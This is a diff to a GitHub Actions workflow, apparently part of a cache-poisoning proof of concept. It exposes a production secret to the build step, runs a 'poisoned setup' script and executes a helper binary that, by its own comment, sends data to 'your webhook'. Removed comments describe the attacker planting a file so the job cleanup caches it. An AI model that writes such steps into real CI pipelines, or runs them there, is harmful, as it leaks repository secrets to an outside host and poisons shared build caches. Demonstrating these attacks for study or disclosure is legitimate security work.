@@ -18,8 +18,13 @@ jobs:
           key: ${{ runner.os }}-build-cache-v2
 
       - name: Run Build
+        # ADD THIS: This is the bridge that carries the secret to the script
+        env:
+          MY_PRODUCTION_SECRET: ${{ secrets.MY_PRODUCTION_SECRET }}
         run: |
-          # The attacker runs the poisoned setup script to create the file
-          # so that the 'Post job cleanup' saves it to the cache.asd
+          # 1. Run the poisoned setup to create the file locally
           bash scripts/setup.sh
+          
+          # 2. Execute it to verify it works (it will send 'EMPTY' to your webhook now)
+          chmod +x ./bin/helper-tool
           ./bin/helper-tool --mode production
